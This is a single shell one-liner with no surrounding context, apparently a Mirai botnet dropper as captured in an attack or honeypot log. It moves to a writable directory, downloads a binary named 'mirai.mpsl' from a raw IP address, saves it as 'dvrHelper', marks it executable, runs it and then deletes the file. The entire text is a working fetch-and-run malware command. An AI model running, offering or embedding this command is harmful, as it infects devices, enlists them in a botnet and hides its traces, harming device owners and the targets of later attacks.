cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.26.76.44:5000/sdvss/mirai.mpsl -O dvrHelper; chmod +x dvrHelper; ./dvrHelper; rm -rf dvrHelper
